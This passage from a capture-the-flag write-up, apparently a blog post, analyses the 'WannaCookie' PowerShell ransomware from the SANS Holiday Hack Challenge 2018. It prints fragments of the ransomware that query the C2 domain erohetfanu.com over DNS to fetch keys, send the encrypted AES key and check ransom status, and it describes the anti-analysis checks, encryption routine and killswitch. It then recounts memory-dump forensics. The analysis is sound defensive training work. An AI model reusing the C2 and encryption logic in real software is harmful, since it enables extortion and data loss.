                &lt;span class="nv"&gt;$c_n_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$c_id.72616e736f6d697370616964.erohetfanu.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$c_n_k&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="n"&gt;32&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$c_n_k&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;UNPAID|$c_id|$d_t&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nv"&gt;$Resp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;statuscode&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;404&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;404 Not Found&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;
            &lt;span class="nv"&gt;$buffer&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[Text.Encoding]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$html&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nv"&gt;$Resp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ContentLength64&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$buffer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$Resp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OutputStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$buffer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nv"&gt;$Resp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$close&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Stop&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;finally&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Stop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="n"&gt;wanc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Whew, that's a lot of script. We'll analyze it more deeply in the next
question. The script defines many functions. The main one seems to be
&lt;code&gt;wanc&lt;/code&gt;, since it's called at the end of the script. Let's take a look at
the beginning of this function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;wanc&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$S1&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$null&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2A&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;ti_rox&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;G2B&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="nv"&gt;$S1&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="n"&gt;6B696C6C737769746368&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;&lt;span class="p"&gt;))).&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="n"&gt;-ErrorAction&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;        &lt;span class="k"&gt;return&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;($(&lt;/span&gt;&lt;span class="n"&gt;netstat&lt;/span&gt; &lt;span class="n"&gt;-ano&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Select-String&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;127.0.0.1:8080&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="o"&gt;-or&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Get-WmiObject&lt;/span&gt; &lt;span class="n"&gt;Win32_ComputerSystem&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Domain&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;KRINGLECASTLE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="no"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The function begins by making some kind of DNS request. If it resolves, then
it immediatly returns. It also checks if something is listening on
&lt;code&gt;127.0.0.1:8080&lt;/code&gt; (&lt;em&gt;i.e.&lt;/em&gt; if the ransomware is already running), and if
the Active Directory domain of the infected machine is &lt;code&gt;KRINGLECASTLE&lt;/code&gt;:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The first check (the DNS check) is used to make sure that the ransomware is
not being ran in a virtual machine. This check is similar to what
&lt;a class="reference external" href="https://twitter.com/MalwareTechBlog"&gt;&amp;#64;MalwareTechBlog&lt;/a&gt; found in the
WannaCry ransomware.&lt;/li&gt;
&lt;li&gt;The second check (the network check and the Active Directory check) is to
make sure that the ransomware is running on the intended target, and is not
being ran more than once.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Similarly to WannaCry, if we register the killswitch domain, then it will
always resolved and the ransomware will stop working. To find the kill switch
domain, let's just execute the PowerShell code used to generate it. To run
this command, the variable &lt;code&gt;S1&lt;/code&gt; and the functions &lt;code&gt;H2A&lt;/code&gt;,
&lt;code&gt;B2H&lt;/code&gt;, &lt;code&gt;H2B&lt;/code&gt;, &lt;code&gt;G2B&lt;/code&gt;, and &lt;code&gt;ti_rox&lt;/code&gt; must be defined:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2A&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;ti_rox&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;G2B&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="nv"&gt;$S1&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="n"&gt;6B696C6C737769746368&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;span class="go"&gt;yippeekiyaa.aaay&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The killswitch domain seems to be &lt;code&gt;yippeekiyaa.aaay&lt;/code&gt;. Let's register it
on &lt;a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html"&gt;HoHoHo Daddy&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="hohoho_daddy_success.png" class="align-center" src="/images/sans-christmas-challenge-2018/hohoho_daddy_success.png" /&gt;
&lt;p&gt;Alright! We stopped the malware. We can now feel like &amp;#64;MalwareTechBlog. You
know, without the federal investigation and stuff... Anyway! The sentence is
&lt;code&gt;Successfully registered yippeekiyaa.aaay!&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="memory-dump-analysis"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id43"&gt;Memory Dump Analysis&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Alabaster needs us to decrypt his password database, that was encrypted by the
WannaCookie ransomware.&lt;/p&gt;
&lt;img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" /&gt;
&lt;p&gt;&lt;em&gt;Alabaster says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Yippee-Ki-Yay! Now, I have a ma... kill-switch!&lt;/p&gt;
&lt;p&gt;Now that we don't have to worry about new infections, I could sure use your
L337 security skills for one last thing.&lt;/p&gt;
&lt;p&gt;As I mentioned, I made the mistake of analyzing the malware on my host
computer and the ransomware encrypted my password database.&lt;/p&gt;
&lt;p&gt;Take this &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip"&gt;zip&lt;/a&gt;
with a memory dump and my encrypted password database, and see if you can
recover my passwords.&lt;/p&gt;
&lt;p&gt;One of the passwords will unlock our access to the vault so we can get in
before the hackers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Alright, a lot is happening. Here's what we can see from the source code:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The function &lt;code&gt;e_d_file&lt;/code&gt; takes a key, a file, and a boolean. If the
boolean is true, the file is encrypted using AES in CBC mode. If the boolean
is false, the file is decrypted using the same algorithm.&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;Some helper functions are defined:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;&lt;code&gt;H2B&lt;/code&gt;, &lt;code&gt;B2H&lt;/code&gt;: convert data from/to hexadecimal strings
to/from binary objects.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;H2A&lt;/code&gt;, &lt;code&gt;A2H&lt;/code&gt;: convert data from/to hexadecimal strings
to/from byte arrays.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;G2B&lt;/code&gt;, &lt;code&gt;B2G&lt;/code&gt;: convert data from/to compressed data to/from
binary objects.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;ti_rox&lt;/code&gt; seems to XOR two variables.&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;sh1&lt;/code&gt; is just a wrapper to the SHA1 hashing function.&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;p_k_e&lt;/code&gt; encrypts a variable using a public key.&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;e_n_d&lt;/code&gt; encrypts/decrypts a list of files using an AES
key (by calling the &lt;code&gt;e_d_file&lt;/code&gt; function).&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;g_o_dns&lt;/code&gt; seems to recover some data from the
&lt;code&gt;erohetfanu.com&lt;/code&gt; DNS server.&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;s_2_c&lt;/code&gt; splits a string into chunks.&lt;/li&gt;
&lt;li&gt;The function &lt;code&gt;snd_k&lt;/code&gt; sends, chunk by chunk, a string to the
&lt;code&gt;erohetfanu.com&lt;/code&gt; DNS server.&lt;/li&gt;
&lt;li&gt;Finally, the function &lt;code&gt;wanc&lt;/code&gt; is the main function.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's analyze how the malware works, so that we can find a way to decrypt
Alabaster's passwords. Here's what &lt;code&gt;wanc&lt;/code&gt; does:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;It first checks the killswitch domain, whether the malware is already
running, and if it's running on the intended target.&lt;/li&gt;
&lt;li&gt;It then recovers what seems to be a public key, &lt;code&gt;$p_k&lt;/code&gt;, from the DNS
server, with the following command: &lt;code&gt;g_o_dns(&amp;quot;7365727665722E637274&amp;quot;)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;It then generates an AES key, &lt;code&gt;$b_k&lt;/code&gt;, using two arrays of bytes from
1 to 255 (no zero), and the function &lt;code&gt;Get-Random&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The key is hex-encoded in &lt;code&gt;$h_k&lt;/code&gt;, which is then hashed using SHA1 and
stored in &lt;code&gt;$k_h&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The AES key &lt;code&gt;$b_k&lt;/code&gt; is encrypted using the public key &lt;code&gt;$p_k&lt;/code&gt;. The
result is stored in &lt;code&gt;$p_k_e_k&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The encrypted key, &lt;code&gt;$p_k_e_k&lt;/code&gt; is sent to the DNS server, which gives
a victim id, &lt;code&gt;$c_id&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The current date in UTC is stored in &lt;code&gt;$d_t&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;A list of all &lt;code&gt;*.elfdb&lt;/code&gt; files is generated, and then encrypted using
&lt;code&gt;$b_k&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The variables &lt;code&gt;$b_k&lt;/code&gt; and &lt;code&gt;$h_k&lt;/code&gt; are cleared using
&lt;code&gt;Clear-Variable&lt;/code&gt;. (The variable &lt;code&gt;$key&lt;/code&gt;, which holds the value of
&lt;code&gt;$b_k&lt;/code&gt; in &lt;code&gt;e_d_file&lt;/code&gt; is also cleared).&lt;/li&gt;
&lt;li&gt;The malware sets up an HTTP listener on &lt;code&gt;127.0.0.1:8080&lt;/code&gt;, which
displays an HTML ransom message, downloaded from the DNS server, using the
code &lt;code&gt;g_o_dns (A2H &amp;quot;source.min.html&amp;quot;)&lt;/code&gt;. The HTTP listener handles
decryption requests: when the victim pays the ransom, the decryption key is
given to them. They can then enter them in the HTTP listener, which will
compare this key's SHA1 sum to the one it has in memory in the variable
&lt;code&gt;$k_h&lt;/code&gt;. If they match, the files are decrypted.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="section" id="id3"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id44"&gt;All the dead ends, yay!&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Alright, knowing this, how can we try and recover Alabaster's passwords? Here's
a list of the things that I tried and that &lt;strong&gt;don't work&lt;/strong&gt;, but still took a
whole lot of time to test (and then had the audacity of &lt;strong&gt;not being the right
solutions, damn them!&lt;/strong&gt;). Again, if you just directly want the right solution,
you can &lt;a class="reference external" href="#id4"&gt;jump to it&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I first thought that maybe the keys weren't correctly cleared in the memory
dump and that I could recover them, using tools such as &lt;code&gt;aes-finder&lt;/code&gt;,
&lt;code&gt;aeskeyfind&lt;/code&gt;, &lt;code&gt;findaes&lt;/code&gt;, etc. But these tools did not find
anything.&lt;/p&gt;
&lt;p&gt;I then thought that maybe the &lt;a class="reference external" href="https://tools.kali.org/forensics/volatility"&gt;Volatility framework&lt;/a&gt; could help. But it doesn't
support the Mini DuMP format used in the dump. So, another deadend.&lt;/p&gt;
&lt;p&gt;I then thought thay maybe the password file or the encryption key could be
found in cleartext using &lt;code&gt;binwalk&lt;/code&gt;. But it only returned what I think
were many false-positives, and no password file or encryption key.&lt;/p&gt;
&lt;p&gt;On to my next deadend, which stole most of my time. It's common for ransomware
to generate weak encryption keys, because of unproper random initialization.
Here's an &lt;a class="reference external" href="https://blog.malwarebytes.com/threat-analysis/2018/03/encryption-101-how-to-break-encryption/"&gt;example&lt;/a&gt;.
If you remember, the malware generates the AES key using the PowerShell
function &lt;code&gt;Get-Random&lt;/code&gt;, without any seed. I did a little research on this
function, and found some &lt;a class="reference external" href="https://www.reddit.com/r/Iota/comments/6v9mj6/psa_nearly_all_powershell_generated_seeds_are/"&gt;resources online&lt;/a&gt;
that suggested that maybe the randomness produced by &lt;code&gt;Get-Random&lt;/code&gt; was
not cryptographically-secure. I then read &lt;a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-random?view=powershell-6"&gt;Microsoft's documentation of the
function&lt;/a&gt;,
which states (emphasis mine):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;-SetSeed&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Specifies a seed value for the random number generator. This seed value is
used for the current command and for all subsequent Get-Random commands in
the current session until you use SetSeed again or close the session. You
cannot reset the seed to its default, clock-based value.&lt;/p&gt;
&lt;p&gt;The SetSeed parameter is not required. &lt;strong&gt;By default, Get-Random uses the
system clock to generate a seed value&lt;/strong&gt;. Because SetSeed results in
non-random behavior, it is typically used only when trying to reproduce
behavior, such as when debugging or analyzing a script that includes
Get-Random commands.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I thought I had my ticket with this. I thought that if I found at what time the
ransomware was launched, I could use this time as a seed to regenerate the
encryption key. Luckily, we have several ways to find around which time the
ransomware was launched. First, it's in the metadata of the dump file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; file powershell.exe_181109_104716.dmp
&lt;span class="go"&gt;powershell.exe_181109_104716.dmp: Mini DuMP crash report, 19 streams, Fri Nov  9 15:47:39 2018, 0x61826 type&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, if you remember, the current date was stored in a variable &lt;code&gt;$d_t&lt;/code&gt;
in the ransomware. This date was displayed in the HTML listener, next to the
payment status:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -a UNPAID powershell.exe_181109_104716.dmp
&lt;span class="go"&gt;�B_��RE_��_E_ ����OUNPAID|               4739626449686a334d36|Friday, November 09, 2018 3:25:34 PM&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the ransomware was launched on Friday, November 09, 2018, around 3:00 PM.
Now that I knew the time of launch, I could try to regenerate the AES key
using &lt;code&gt;Get-Random&lt;/code&gt;. Or so I thought... No matther how I initialized the
key, I wasn't able to obtain reproductible results using &lt;code&gt;Get-Random&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I then saw online that maybe &lt;code&gt;Get-Random&lt;/code&gt; is not seeded with the system
date, but with the system uptime, using &lt;code&gt;TickCounts&lt;/code&gt;. But there again, I
wasn't able to obtain reproductible results. I did some more digging, and
&lt;a class="reference external" href="https://stackoverflow.com/questions/45135091/what-prng-does-get-random-in-powershell-5-1-use"&gt;several&lt;/a&gt;
StackOverflow &lt;a class="reference external" href="https://stackoverflow.com/questions/34331541/what-is-the-default-seed-for-powershell-get-random-cmdlet"&gt;posts&lt;/a&gt;
indicated that the seed initialization is trickier that I thought. As suggested
by one of these posts, I took a look at PowerShell's source code on &lt;a class="reference external" href="https://github.com/PowerShell/PowerShell/blob/master/src/Microsoft.PowerShell.Commands.Utility/commands/utility/GetRandomCommand.cs"&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There, you can see that if you initialize the seed using &lt;code&gt;-SetSeed&lt;/code&gt;, you
can see that the random generator used is &lt;code&gt;System.Random&lt;/code&gt;. If you don't
initialize the seed, the random generator used is
&lt;code&gt;System.Security.Cryptography.RandomNumberGenerator&lt;/code&gt;. However, &lt;a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=netframework-4.7.2"&gt;this
function&lt;/a&gt;
does not seem to have any weakness in its seed initialization process.&lt;/p&gt;
&lt;p&gt;After having wasted three days on this track, I gave up and asked for my
coworkers' help. While most of them were busy and made me understand in
colorful phrasing that they didn't have the time to help me, one of them,
&lt;a class="reference external" href="https://github.com/imaibou"&gt;imaibou&lt;/a&gt;, had some time to take a look.&lt;/p&gt;
&lt;p&gt;He ran a deweaponized version of the ransomware (where the encryption was
commented out) and then produced a dump of the PowerShell process. He then
mentioned to me that he was able to find out his AES key (that he had printed
out) in the memory dump of his process. Ha! I was right from the start: the
key is not properly cleared from the memory. Or so I thought, yet again...
We tried searching for the keys in Alabater's memory dump in every imaginable
format:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;In raw hexadecimal (&lt;code&gt;\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;In UTF16-LE encoded hexadecimal (&lt;code&gt;\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;In printable hex representation (&lt;code&gt;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;In UTF16-LE encoded printable hex representation (&lt;code&gt;XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;In oh-so-many other formats...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But no luck. Even though we managed to find our key in our home-made memory
dump, we couldn't find the key in Alabaster's dump. Even our boss, Christophe,
took time out of his schedule to lend a hand. but even his security super
powers didn't manage to take us out of this slump.&lt;/p&gt;
&lt;p&gt;Out of ideas, ashamed, and tired, we went and looked at the hints for this
question. Here's what we were given:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;wannacookie.min.ps1&lt;/code&gt;? I wonder if there is a non-minified version?
If so, it may be easier to read and give us more information and maybe
source comments?&lt;/p&gt;
&lt;p&gt;Whoa, &lt;a class="reference external" href="http://www.youtube.com/watch?v=wd12XRq2DNk"&gt;Chris Davis' talk&lt;/a&gt; on
PowerShell malware is crazy pants! You should check it out!&lt;/p&gt;
&lt;p&gt;Pulling strings from a memory dump using the linux &lt;code&gt;strings&lt;/code&gt; command
requires you specify the &lt;code&gt;-e&lt;/code&gt; option with the specific format
required by the OS and processor. Of course, you could also use
&lt;a class="reference external" href="https://github.com/chrisjd20/power_dump"&gt;powerdump&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I didn't understand the reference to &lt;code&gt;wannacookie.min.ps1&lt;/code&gt;, since I
hadn't seen this filename anywhere (but more on that later).&lt;/p&gt;
&lt;p&gt;I then felt stupid: I had forgotten that KringleCon is initially a security
conference. I then proceeded to watch Chris Davis' talk on PowerShell malware
memory analysis, where he presents his tool &lt;code&gt;power_dump&lt;/code&gt;, which can be
used to analyze memory dump of PowerShell processes, and extract variables.&lt;/p&gt;
&lt;p&gt;I loaded up &lt;code&gt;power_dump&lt;/code&gt;, sighing that I finally will be able to answer
this question. I used the tool to search for 32-byte long hexadecimal
